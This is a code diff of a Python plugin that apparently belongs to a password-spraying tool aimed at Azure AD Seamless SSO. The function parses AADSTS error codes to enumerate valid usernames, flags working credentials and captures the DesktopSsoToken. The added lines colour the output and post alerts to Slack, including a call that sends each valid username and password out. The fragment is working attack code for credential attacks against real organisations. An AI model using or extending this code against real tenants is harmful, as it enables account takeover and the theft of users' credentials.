@@ -2,7 +2,6 @@ import datetime, requests, uuid, re
 import utils.utils as utils
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-
 def azuresso_authenticate(url, username, password, useragent, pluginargs):
 
     ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
@@ -103,31 +102,36 @@ def azuresso_authenticate(url, username, password, useragent, pluginargs):
             data_response['success'] = False
 
         elif "AADSTS50126" in xmlresponse:
-            data_response['output'] = "[+] VALID USERNAME, invalid password: {}".format(creds)
+            data_response['output'] = utils.prYellow("[+] VALID USERNAME, invalid password: {}".format(creds))
             data_response['success'] = False
+            utils.slacklog("Alert: Username valid but password incorrect")
 
         elif "DesktopSsoToken" in xmlresponse:
-            data_response['output'] = "[+] VALID CREDS : {}".format(creds)
+            data_response['output'] = utils.prGreen("[+] VALID CREDS : {}".format(creds))
             data_response['success'] = True
+            utils.slacknotify(username, password)
 
             token = re.findall(r"<DesktopSsoToken>.{1,}</DesktopSsoToken>", xmlresponse)
             if (token):
                 data_response['output'] += " - GOT TOKEN {}".format(token[0])
 
         elif "AADSTS50056" in xmlresponse:
-            data_response['output'] = "[+] VALID USERNAME, no password in AzureAD: {}".format(creds)
+            data_response['output'] = utils.prYellow("[+] VALID USERNAME, no password in AzureAD: {}".format(creds))
             data_response['success'] = False
+            utils.slacklog("Alert: Username valid but password is not in AzureAD")
 
         elif "AADSTS80014" in xmlresponse:
-            data_response['output'] = "[+] VALID USERNAME, max pass-through authentication time exceeded :{}".format(creds)
+            data_response['output'] = utils.prYellow("[+] VALID USERNAME, max pass-through authentication time exceeded :{}".format(creds))
             data_response['success'] = False
+            utils.slacklog("Alert: Username valid but max pass-through authentication time exceeded")
 
         elif "AADSTS50053" in xmlresponse:
-            data_response['output'] = "[?] SMART LOCKOUT DETECTED - Unable to enumerate:{}".format(creds)
+            data_response['output'] = utils.prYellow("[?] SMART LOCKOUT DETECTED - Unable to enumerate:{}".format(creds))
             data_response['success'] = False
+            utils.slacklog("Alert: SMART LOCKOUT DETECTED")
 
         else:
-            data_response['output'] = "[!] Unknown Response : {}".format(creds)
+            data_response['output'] = utils.prYellow("[!] Unknown Response : {}".format(creds))
             data_response['success'] = False
 
 
